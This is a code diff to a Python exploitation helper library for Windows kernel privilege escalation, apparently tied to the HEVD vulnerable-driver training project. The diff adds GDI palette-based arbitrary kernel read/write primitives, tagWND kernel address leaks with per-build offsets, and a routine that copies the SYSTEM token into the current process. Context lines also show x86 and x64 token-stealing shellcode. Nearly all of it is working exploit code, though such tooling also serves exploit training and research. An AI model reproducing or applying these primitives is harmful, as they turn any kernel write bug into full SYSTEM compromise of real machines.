@@ -15,6 +15,7 @@ PROCESSINFOCLASS = DWORD
 ULONG = c_uint32
 PULONG = POINTER(ULONG)
 NTSTATUS = DWORD
+HPALETTE = HANDLE
 
 #to be filled properly
 class PEB(Structure):
@@ -76,7 +77,22 @@ class WNDCLASSEX(Structure):
 		("lpszClassName", LPCWSTR),
 		("hIconSm", HANDLE)
 	]
- 
+
+class PALETTEENTRY(Structure):
+	_fields_ = [
+		("peRed", BYTE),
+		("peGreen", BYTE),
+		("peBlue", BYTE),
+		("peFlags", BYTE)
+	]
+
+class LOGPALETTE(Structure):
+	_fields_ = [
+		("palVersion", WORD),
+		("palNumEntries", WORD),
+		("palPalEntry", POINTER(PALETTEENTRY))
+	]
+
 #########################################################################################
 ###################################Function definitions##################################
 #########################################################################################
@@ -87,6 +103,15 @@ ntdll = windll.ntdll
 gdi32 = windll.gdi32
 shell32 = windll.shell32
 user32 = windll.user32
+
+gdi32.CreatePalette.argtypes = [LPVOID]
+gdi32.CreatePalette.restype = HPALETTE
+
+gdi32.GetPaletteEntries.argtypes = [HPALETTE, UINT, UINT, LPVOID]
+gdi32.GetPaletteEntries.restype = UINT
+
+gdi32.SetPaletteEntries.argtypes = [HPALETTE, UINT, UINT, LPVOID]
+gdi32.SetPaletteEntries.restype = UINT
 
 ntdll.NtQueryInformationProcess.argtypes = [HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG]
 ntdll.NtQueryInformationProcess.restype = NTSTATUS
@@ -396,7 +421,7 @@ def get_pvscan0_address(bitmap_handle):
 	pvscan0_address = gdicell64.contents.pKernelAddress + 0x50 #0x18 to SurfObj SURFOBJ64 -> 0x38 into SURFOBJ64 pvScan0 ULONG64
 	return pvscan0_address
 
-def set_address(manager_bitmap, address):
+def set_address_bitmap(manager_bitmap, address):
 	"""
 	Sets the pvscan0 of the worker to the address we want to read/write later through the manager_bitmap
 	@param manager_bitmap: handle to the manager bitmap
@@ -405,7 +430,7 @@ def set_address(manager_bitmap, address):
 	address = c_ulonglong(address)
 	gdi32.SetBitmapBits(manager_bitmap, sizeof(address), addressof(address));
 	
-def write_memory(manager_bitmap, worker_bitmap, dst, src, len):
+def write_memory_bitmap(manager_bitmap, worker_bitmap, dst, src, len):
 	"""
 	Writes len number of bytes to the destination memory address from the source memory
 	@param manager_bitmap: handle to the manager bitmap
@@ -414,10 +439,10 @@ def write_memory(manager_bitmap, worker_bitmap, dst, src, len):
 	@param src: the source to copy from
 	@param len: the amount to write
 	"""
-	set_address(manager_bitmap, dst)
+	set_address_bitmap(manager_bitmap, dst)
 	gdi32.SetBitmapBits(worker_bitmap, len, src)
 	
-def read_memory(manager_bitmap, worker_bitmap, src, dst, len):
+def read_memory_bitmap(manager_bitmap, worker_bitmap, src, dst, len):
 	"""
 	Reads len number of bytes to the destination memory address from the source memory
 	@param manager_bitmap: handle to the manager bitmap
@@ -426,11 +451,77 @@ def read_memory(manager_bitmap, worker_bitmap, src, dst, len):
 	@param src: the source to read from
 	@param len: the amount to read
 	"""
-	set_address(manager_bitmap, src)
+	set_address_bitmap(manager_bitmap, src)
 	gdi32.GetBitmapBits(worker_bitmap, len, dst)
 
+def create_palette_with_size(s):
+	"""
+	Creates a palette with the size we want
+	@param s: size of the palette
+	@return: handle to the palette
+	"""
+	p = platform.platform()
+	#from Windows v1607 onwards the PALETTE HEADER is smaller with 8 bytes
+	if p == 'Windows-10-10.0.14393' or p == 'Windows-10-10.0.15063' or p == 'Windows-10-10.0.16299':
+		palette_entries_offset = 0x88
+	elif p == 'Windows-10-10.0.10586' or p == 'Windows-8-6.2.9200-SP0' or p == 'Windows-8.1-6.3.9600' or p == 'Windows-7-6.1.7601-SP1':
+		palette_entries_offset = 0x90
+	else:
+		print "[-] This platform is not supported for palettes"
+		sys.exit(-1)
+
+	if s <= palette_entries_offset:
+		print '[-] Bad plaette size! can\'t allocate palette of size < %s!' % hex(palette_entries_offset)
+		sys.exit(-1)
+	pal_cnt = (s - palette_entries_offset) / 4
+	lPalette = LOGPALETTE()
+	lPalette.palNumEntries = pal_cnt
+	lPalette.palVersion = 0x300
+	palette_handle = gdi32.CreatePalette(byref(lPalette))
+	if palette_handle == None:
+		print '[-] Couldn\'t create palette, exiting...'
+		sys.exit(-1)
+	return palette_handle
+
+def set_address_palette(manager_platte_handle, address):
+	"""
+	Sets the pFirstColor of the worker to the address we want to read/write later through the manager palette
+	@param manager_platte_handle: handle to the manager palette
+	@param address: the address to be set in worker palette's pFirstColor pointer
+	"""
+	address = c_ulonglong(address)
+	#we need to divide the len by 4 as the PALETTENTRY is 4 byte
+	gdi32.SetPaletteEntries(manager_platte_handle, 0, sizeof(address)/4, addressof(address));
+	
+def write_memory_palette(manager_platte_handle, worker_platte_handle, dst, src, len):
+	"""
+	Writes len number of bytes to the destination memory address from the source memory
+	@param manager_platte_handle: handle to the manager palette
+	@param worker_platte_handle: handle to the worker palette
+	@param dst: destination to write to
+	@param src: the source to copy from
+	@param len: the amount to write
+	"""
+	set_address_palette(manager_platte_handle, dst)
+	#we need to divide the len by 4 as the PALETTENTRY is 4 byte
+	gdi32.SetPaletteEntries(worker_platte_handle, 0, len/4, src)
+	
+def read_memory_palette(manager_platte_handle, worker_platte_handle, src, dst, len):
+	"""
+	Reads len number of bytes to the destination memory address from the source memory
+	@param manager_platte_handle: handle to the manager bitmap
+	@param worker_platte_handle: handle to the worker bitmap
+	@param dst: destination to copy to
+	@param src: the source to read from
+	@param len: the amount to read
+	"""
+	set_address_palette(manager_platte_handle, src)
+	#we need to divide the len by 4 as the PALETTENTRY is 4 byte
+	gdi32.GetPaletteEntries(worker_platte_handle, 0, len/4, dst)
+
+
 #original source: https://github.com/GradiusX/HEVD-Python-Solutions
-def get_current_eprocess(manager_bitmap, worker_bitmap, pointer_EPROCESS):
+def get_current_eprocess_bitmap(manager_bitmap, worker_bitmap, pointer_EPROCESS):
 	"""
 	This function gets the kernel address of the current EPROCESS structure. It does it by going through the EPROCESS linked list.
 	We need the bitmaps in order to read from memory.
@@ -441,21 +532,55 @@ def get_current_eprocess(manager_bitmap, worker_bitmap, pointer_EPROCESS):
 	"""
 	if platform.architecture()[0] == '64bit':
 		#get OS EPROCESS structure constans values
-		(KTHREAD_Process, EPROCESS_ActiveProcessLinks, EPROCESS_UniqueProcessId, EPROCESS_Token) = setosvariablesx64()
+		(KTHREAD_Process, EPROCESS_ActiveProcessLinks, EPROCESS_UniqueProcessId, EPROCESS_Token) = getosvariablesx64()
 		flink = c_ulonglong()
-		read_memory(manager_bitmap, worker_bitmap, pointer_EPROCESS + EPROCESS_ActiveProcessLinks, byref(flink), sizeof(flink));	
+		read_memory_bitmap(manager_bitmap, worker_bitmap, pointer_EPROCESS + EPROCESS_ActiveProcessLinks, byref(flink), sizeof(flink));	
 		current_pointer_EPROCESS = 0
 		while (1):
 			unique_process_id = c_ulonglong(0)
 			# Adjust EPROCESS pointer for next entry; flink.value is pointing to the next Flink so we need to subtract that offset
 			pointer_EPROCESS = flink.value - EPROCESS_ActiveProcessLinks
 			# Get PID; 
-			read_memory(manager_bitmap, worker_bitmap, pointer_EPROCESS + EPROCESS_UniqueProcessId, byref(unique_process_id), sizeof(unique_process_id));	
+			read_memory_bitmap(manager_bitmap, worker_bitmap, pointer_EPROCESS + EPROCESS_UniqueProcessId, byref(unique_process_id), sizeof(unique_process_id));	
 			# Check if we're in the current process
 			if (os.getpid() == unique_process_id.value):
 				current_pointer_EPROCESS = pointer_EPROCESS
 				break
-			read_memory(manager_bitmap, worker_bitmap, pointer_EPROCESS + EPROCESS_ActiveProcessLinks, byref(flink), sizeof(flink));	
+			read_memory_bitmap(manager_bitmap, worker_bitmap, pointer_EPROCESS + EPROCESS_ActiveProcessLinks, byref(flink), sizeof(flink));	
+			# If next same as last, we've reached the end
+			if (pointer_EPROCESS == flink.value - EPROCESS_ActiveProcessLinks):
+				break		
+		return current_pointer_EPROCESS
+	else:
+		print "[-] Getting the current EPROCESS strcuture function is not prepared to work on x86, exiting..."
+		sys.exit(-1)
+
+def get_current_eprocess_palette(manager_palette, worker_palette, pointer_EPROCESS):
+	"""
+	This function gets the kernel address of the current EPROCESS structure. It does it by going through the EPROCESS linked list.
+	We need the palettes in order to read from memory.
+	@param manager_palette: handle to the manager palette
+	@param worker_palette: handle to the worker palette
+	@param pointer_EPROCESS: pointer to an EPROCESS structure to start with (typically SYSTEM)
+	@return: pointer to the current EPROCESS structure
+	"""
+	if platform.architecture()[0] == '64bit':
+		#get OS EPROCESS structure constans values
+		(KTHREAD_Process, EPROCESS_ActiveProcessLinks, EPROCESS_UniqueProcessId, EPROCESS_Token) = getosvariablesx64()
+		flink = c_ulonglong()
+		read_memory_palette(manager_palette, worker_palette, pointer_EPROCESS + EPROCESS_ActiveProcessLinks, byref(flink), sizeof(flink));	
+		current_pointer_EPROCESS = 0
+		while (1):
+			unique_process_id = c_ulonglong(0)
+			# Adjust EPROCESS pointer for next entry; flink.value is pointing to the next Flink so we need to subtract that offset
+			pointer_EPROCESS = flink.value - EPROCESS_ActiveProcessLinks
+			# Get PID; 
+			read_memory_palette(manager_palette, worker_palette, pointer_EPROCESS + EPROCESS_UniqueProcessId, byref(unique_process_id), sizeof(unique_process_id));	
+			# Check if we're in the current process
+			if (os.getpid() == unique_process_id.value):
+				current_pointer_EPROCESS = pointer_EPROCESS
+				break
+			read_memory_palette(manager_palette, worker_palette, pointer_EPROCESS + EPROCESS_ActiveProcessLinks, byref(flink), sizeof(flink));	
 			# If next same as last, we've reached the end
 			if (pointer_EPROCESS == flink.value - EPROCESS_ActiveProcessLinks):
 				break		
@@ -474,24 +599,51 @@ def tokenstealing_with_bitmaps(manager_bitmap, worker_bitmap):
 		# Get SYSTEM EPROCESS
 		PsInitialSystemProcess = get_psinitialsystemprocess()
 		system_EPROCESS = c_ulonglong()
-		read_memory(manager_bitmap, worker_bitmap, PsInitialSystemProcess, byref(system_EPROCESS), sizeof(system_EPROCESS));	
+		read_memory_bitmap(manager_bitmap, worker_bitmap, PsInitialSystemProcess, byref(system_EPROCESS), sizeof(system_EPROCESS));	
 		system_EPROCESS = system_EPROCESS.value	
 		print "[+] SYSTEM EPROCESS: %s" % hex(system_EPROCESS)
 	
 		# Get current EPROCESS
-		current_EPROCESS = get_current_eprocess(manager_bitmap, worker_bitmap, system_EPROCESS)
+		current_EPROCESS = get_current_eprocess_bitmap(manager_bitmap, worker_bitmap, system_EPROCESS)
 		print "[+] Current EPROCESS: %s" % hex(current_EPROCESS)
 
-		(KTHREAD_Process, EPROCESS_ActiveProcessLinks, EPROCESS_UniqueProcessId, EPROCESS_Token) = setosvariablesx64()
+		(KTHREAD_Process, EPROCESS_ActiveProcessLinks, EPROCESS_UniqueProcessId, EPROCESS_Token) = getosvariablesx64()
 		system_token = c_ulonglong()
 		print "[+] Reading System TOKEN"
-		read_memory(manager_bitmap, worker_bitmap, system_EPROCESS + EPROCESS_Token, byref(system_token), sizeof(system_token));
+		read_memory_bitmap(manager_bitmap, worker_bitmap, system_EPROCESS + EPROCESS_Token, byref(system_token), sizeof(system_token));
 		print "[+] Writing System TOKEN"
-		write_memory(manager_bitmap, worker_bitmap, current_EPROCESS + EPROCESS_Token, byref(system_token), sizeof(system_token));
+		write_memory_bitmap(manager_bitmap, worker_bitmap, current_EPROCESS + EPROCESS_Token, byref(system_token), sizeof(system_token));
 	else:
 		print "[-]Token stealing with bitmaps function is not prepared to work on x86, exiting..."
 		sys.exit(-1)
 	
+def tokenstealing_with_palettes(manager_palette, worker_palette):
+	"""
+	This function perform tokenstealing with the help of palettes
+	@param manager_palette: handle to the manager palette
+	@param worker_palette: handle to the worker palette	
+	"""
+	if platform.architecture()[0] == '64bit':
+		# Get SYSTEM EPROCESS
+		PsInitialSystemProcess = get_psinitialsystemprocess()
+		system_EPROCESS = c_ulonglong()
+		read_memory_palette(manager_palette, worker_palette, PsInitialSystemProcess, byref(system_EPROCESS), sizeof(system_EPROCESS));	
+		system_EPROCESS = system_EPROCESS.value	
+		print "[+] SYSTEM EPROCESS: %s" % hex(system_EPROCESS)
+	
+		# Get current EPROCESS
+		current_EPROCESS = get_current_eprocess_palette(manager_palette, worker_palette, system_EPROCESS)
+		print "[+] Current EPROCESS: %s" % hex(current_EPROCESS)
+		(KTHREAD_Process, EPROCESS_ActiveProcessLinks, EPROCESS_UniqueProcessId, EPROCESS_Token) = getosvariablesx64()
+		system_token = c_ulonglong()
+		print "[+] Reading System TOKEN"
+		read_memory_palette(manager_palette, worker_palette, system_EPROCESS + EPROCESS_Token, byref(system_token), sizeof(system_token));
+		print "[+] Writing System TOKEN"
+		write_memory_palette(manager_palette, worker_palette, current_EPROCESS + EPROCESS_Token, byref(system_token), sizeof(system_token));
+	else:
+		print "[-]Token stealing with palettes function is not prepared to work on x86, exiting..."
+		sys.exit(-1)
+
 def get_accel_kernel_address(handle):
 	"""
 	Returns kernel pointer of Accelerator Table given a Handle to it
@@ -593,28 +745,30 @@ def allocate_free_window(classNumber, pHMValidateHandle):
 	# Register Class and Create Window
 	hCls = user32.RegisterClassExW(byref(wndClass))
 	hWnd = user32.CreateWindowExA(0,"Class_" + str(classNumber),'Franco',0xcf0000,0,0,300,300,0,0,hInst,0)
-
-	if platform.platform() == 'Windows-10-10.0.15063':	
-		# Run HMValidateHandle on Window handle to get a copy of it in userland
-		pWnd = HMValidateHandle(hWnd,1)
-		# Read pSelf from copied Window
-		kernelpSelf = (cast(pWnd+0x20, POINTER(c_ulonglong))).contents.value
-		# Calculate ulClientDelta (tagWND.pSelf - HMValidateHandle())
-		# pSelf = ptr to object in Kernel Desktop Heap; pWnd = ptr to object in User Desktop Heap
-		ulClientDelta = kernelpSelf - pWnd
-		# Read tagCLS from copied Window
-		kernelTagCLS = (cast(pWnd+0xa8, POINTER(c_ulonglong))).contents.value
-		# Calculate user-land tagCLS location: tagCLS - ulClientDelta
-		userTagCLS = kernelTagCLS - ulClientDelta
-		# Calculate kernel-land tagCLS.lpszMenuName
-		tagCLS_lpszMenuName = (cast (userTagCLS+0x90, POINTER(c_ulonglong))).contents.value
+	p = platform.platform()
+	if  p == 'Windows-10-10.0.15063':
+		pcls = 0xa8
+		lpszMenuNameOffset = 0x90
+	elif p == 'Windows-10-10.0.16299':	
+		pcls = 0xa8
+		lpszMenuNameOffset = 0x98
 	else:
-		pWnd = HMValidateHandle(hWnd,1)
-		kernelpSelf = (cast(pWnd+0x20, POINTER(c_ulonglong))).contents.value
-		ulClientDelta = kernelpSelf - pWnd
-		kernelTagCLS = (cast(pWnd+0x98, POINTER(c_ulonglong))).contents.value
-		userTagCLS = kernelTagCLS - ulClientDelta
-		tagCLS_lpszMenuName = (cast (userTagCLS+0x88, POINTER(c_ulonglong))).contents.value
+		pcls = 0x98
+		lpszMenuNameOffset = 0x88
+
+	# Run HMValidateHandle on Window handle to get a copy of it in userland 
+	pWnd = HMValidateHandle(hWnd,1)
+    # Read pSelf from copied Window 
+	kernelpSelf = (cast(pWnd+0x20, POINTER(c_ulonglong))).contents.value
+    # Calculate ulClientDelta (tagWND.pSelf - HMValidateHandle()) 
+    # pSelf = ptr to object in Kernel Desktop Heap; pWnd = ptr to object in User Desktop Heap 
+	ulClientDelta = kernelpSelf - pWnd
+    # Read tagCLS from copied Window 
+	kernelTagCLS = (cast(pWnd+pcls, POINTER(c_ulonglong))).contents.value
+    # Calculate user-land tagCLS location: tagCLS - ulClientDelta 
+	userTagCLS = kernelTagCLS - ulClientDelta
+    # Calculate kernel-land tagCLS.lpszMenuName 
+	tagCLS_lpszMenuName = (cast (userTagCLS+lpszMenuNameOffset, POINTER(c_ulonglong))).contents.value
 		
 	# Destroy Window
 	user32.DestroyWindow(hWnd)
@@ -658,7 +812,7 @@ def gdi_abuse_accelerator_tables_technique():
 	worker_bitmap_pvscan0 = accelerator_address + 0x50
 	return (manager_bitmap_pvscan0, worker_bitmap_pvscan0, manager_bitmap_handle, worker_bitmap_handle)
 
-def gdi_abuse_tagwnd_technique():
+def gdi_abuse_tagwnd_technique_bitmap():
 	"""
 	Technique to be used on Win 10 v1703 or earlier. Locate the pvscan0 address with the help of tagWND structures
 	@return: pvscan0 address of the manager and worker bitmap and the handles
@@ -670,6 +824,33 @@ def gdi_abuse_tagwnd_technique():
 	worker_bitmap_handle = create_bitmap(0x100, 0x6D, 1)
 	worker_bitmap_pvscan0 = window_address + 0x50
 	return (manager_bitmap_pvscan0, worker_bitmap_pvscan0, manager_bitmap_handle, worker_bitmap_handle)
+
+def gdi_abuse_tagwnd_technique_palette():
+	"""
+	Technique to be used on Win 10 v1709 or earlier. Locate the pFirstColor address with the help of tagWND structures
+	@return: pFirstColor address of the manager and worker palettes and the handles
+	"""
+	p = platform.platform()
+	if p == 'Windows-10-10.0.14393' or p == 'Windows-10-10.0.15063' or p == 'Windows-10-10.0.16299':
+		pFirstColor_offset = 0x78
+	elif p == 'Windows-10-10.0.10586' or p == 'Windows-8-6.2.9200-SP0' or p == 'Windows-8.1-6.3.9600' or p == 'Windows-7-6.1.7601-SP1':
+		pFirstColor_offset = 0x80
+	else:
+		print "[-] This platform is not supported for palettes"
+		sys.exit(-1)
+
+	manager_palette_address = alloc_free_windows(0)
+	print "[*] Manager palette kernel address: %s" % hex(manager_palette_address)
+	manager_palette_handle = create_palette_with_size(0x1000)
+	manager_palette_pFirstColor = manager_palette_address + pFirstColor_offset
+	worker_palette_address = alloc_free_windows(0)
+	print "[*] Worker palette kernel kaddress: %s" % hex(worker_palette_address)
+	worker_palette_handle = create_palette_with_size(0x1000)
+	worker_palette_pFirstColor = worker_palette_address + pFirstColor_offset
+	if manager_palette_address == worker_palette_address:
+		print "[-] An error occured during palette allocation, try to rerun the exploit"
+		sys.exit(-1)
+	return (manager_palette_pFirstColor, worker_palette_pFirstColor, manager_palette_handle, worker_palette_handle)
 	
 def get_www_address_and_bitmaps():
 	"""
@@ -682,7 +863,7 @@ def get_www_address_and_bitmaps():
 	elif p == 'Windows-10-10.0.14393':
 		(manager_bitmap_pvscan0, worker_bitmap_pvscan0, manager_bitmap_handle, worker_bitmap_handle) = gdi_abuse_accelerator_tables_technique()
 	elif p == 'Windows-10-10.0.15063':
-		(manager_bitmap_pvscan0, worker_bitmap_pvscan0, manager_bitmap_handle, worker_bitmap_handle) = gdi_abuse_tagwnd_technique()
+		(manager_bitmap_pvscan0, worker_bitmap_pvscan0, manager_bitmap_handle, worker_bitmap_handle) = gdi_abuse_tagwnd_technique_bitmap()
 	else:
 		print "[-] No matching OS found to abuse GDI objects, exiting..."
 		sys.exit(-1)
@@ -691,6 +872,16 @@ def get_www_address_and_bitmaps():
 	what = c_void_p(worker_bitmap_pvscan0)
 	where = manager_bitmap_pvscan0
 	return (what, where, manager_bitmap_handle, worker_bitmap_handle)
+
+def get_www_address_and_palettes():
+	"""
+	Get a What and Where addresses to be used with GDI abuse and the related handles, it should work independent the underlying OS
+	@return: what, where addresses for WWW vulns and manager & worker palettes handles
+	"""
+	(manager_palette_pFirstColor, worker_palette_pFirstColor, manager_palette_handle, worker_palette_handle) = gdi_abuse_tagwnd_technique_palette()
+	what = c_void_p(worker_palette_pFirstColor)
+	where = manager_palette_pFirstColor
+	return (what, where, manager_palette_handle, worker_palette_handle)
 
 
 #########################################################################################
@@ -845,9 +1036,9 @@ def get_haldisp_ofsetsx64():
 	print "[+] HalpSetSystemInformation address: %s" % hex(HalpSetSystemInformation) 
 	return (HaliQuerySystemInformation,HalpSetSystemInformation)
 
-def setosvariablesx86():
+def getosvariablesx86():
 	"""
-	Set various structure variables based on OS version
+	Get various structure variables based on OS version
 	@return: tuple of (KTHREAD_Process, EPROCESS_ActiveProcessLinks, EPROCESS_UniqueProcessId, EPROCESS_Token)
 	"""
 	KTHREAD_Process = 0
@@ -855,6 +1046,7 @@ def setosvariablesx86():
 	EPROCESS_UniqueProcessId = 0
 	EPROCESS_Token = 0
 	version = sys.getwindowsversion()
+	p = platform.platform()
 
 	if((version.major == 5) and (version.minor == 1) and ('3' in version.service_pack)):
 		# the target machine's OS is Windows XP SP3
@@ -888,7 +1080,7 @@ def setosvariablesx86():
 		EPROCESS_UniqueProcessId	 = 0x9C
 		EPROCESS_ActiveProcessLinks  = 0xA0
  
-	elif((version.major == 6) and (version.minor == 1)):
+	elif p == 'Windows-7-6.1.7601-SP1':
 		# the target machine's OS is Windows 7 / SP1
 		print "[*] OS version: Windows 7 / SP1"
 		KTHREAD_Process = 0x50
@@ -902,9 +1094,9 @@ def setosvariablesx86():
 	
 	return (KTHREAD_Process, EPROCESS_ActiveProcessLinks, EPROCESS_UniqueProcessId, EPROCESS_Token)
 
-def setosvariablesx64():
+def getosvariablesx64():
 	"""
-	Set various structure variables based on OS version
+	Gets various structure variables based on OS version
 	# kd> dt nt!_EPROCESS uniqueprocessid token activeprocesslinks
 	# kd> dt nt!_KTHREAD ApcState; dt _KAPC_STATE process
 	@return: tuple of (KTHREAD_Process, EPROCESS_ActiveProcessLinks, EPROCESS_UniqueProcessId, EPROCESS_Token)
@@ -958,6 +1150,12 @@ def setosvariablesx64():
 		EPROCESS_UniqueProcessId = 0x2e0
 		EPROCESS_ActiveProcessLinks = 0x2e8
 		EPROCESS_Token = 0x358
+	elif p == 'Windows-10-10.0.16299':
+		print "[*] OS version: Windows 10x64 v1709 Creators Update"
+		KTHREAD_Process = 0xb8
+		EPROCESS_UniqueProcessId = 0x2e0
+		EPROCESS_ActiveProcessLinks = 0x2e8
+		EPROCESS_Token = 0x358	
 	else:
 		print "[-] No matching OS version, exiting..."
 		sys.exit(-1)
@@ -987,7 +1185,7 @@ def restoretokenx86(RETVAL, extra = ""):
 	@param RETVAL: the value for the ASM RET instruction
 	@return: token restore shellcode related to the platform
 	"""
-	(KTHREAD_Process,EPROCESS_ActiveProcessLinks,EPROCESS_UniqueProcessId,EPROCESS_Token) = setosvariablesx86()
+	(KTHREAD_Process,EPROCESS_ActiveProcessLinks,EPROCESS_UniqueProcessId,EPROCESS_Token) = getosvariablesx86()
 	shellcode =  (
 	"\x52"
 	"\x33\xc0"														# xor	eax,eax
@@ -1013,7 +1211,7 @@ def tokenstealingx86(RETVAL, extra = ""):
 	@param extra: extra shellcode to put after tokenstealing (e.g.: restore stack)
 	@return: token stealing shellcode related to the platform
 	"""
-	(KTHREAD_Process,EPROCESS_ActiveProcessLinks,EPROCESS_UniqueProcessId,EPROCESS_Token) = setosvariablesx86()
+	(KTHREAD_Process,EPROCESS_ActiveProcessLinks,EPROCESS_UniqueProcessId,EPROCESS_Token) = getosvariablesx86()
 	shellcode = (
 	"\x60"																			# pushad
 	"\x33\xc0"																		# xor	eax,eax
@@ -1045,7 +1243,7 @@ def tokenstealingx64(RETVAL, extra = ""):
 	@param extra: extra shellcode to put after tokenstealing (e.g.: restore stack)
 	@return: token stealing shellcode related to the platform
 	"""
-	(KTHREAD_Process,EPROCESS_ActiveProcessLinks,EPROCESS_UniqueProcessId,EPROCESS_Token) = setosvariablesx64()
+	(KTHREAD_Process,EPROCESS_ActiveProcessLinks,EPROCESS_UniqueProcessId,EPROCESS_Token) = getosvariablesx64()
 	shellcode = (
 	"\x65\x48\x8b\x04\x25\x88\x01\x00\x00"												# mov	 rax, [gs:0x188]		 ;Get current ETHREAD in
 	"\x48\x8b\x40" + struct.pack("B",KTHREAD_Process) +									# mov	 rax, [rax+0x68]		 ;Get current KTHREAD_Process address
@@ -1069,6 +1267,11 @@ def tokenstealingx64(RETVAL, extra = ""):
 	return shellcode
 
 def tokenstealing(RETVAL, extra = ""):
-	if sys.maxint > 2147483647: return tokenstealingx64(RETVAL, extra)
+	print "[*] Creating token stealing shellcode"
+	if platform.architecture()[0] == '64bit': return tokenstealingx64(RETVAL, extra)
 	else: return tokenstealingx86(RETVAL, extra)
+	
+def getosvariablesx():
+	if platform.architecture()[0] == '64bit': return getosvariablesx64()
+	else: return getosvariablesx86()
 	
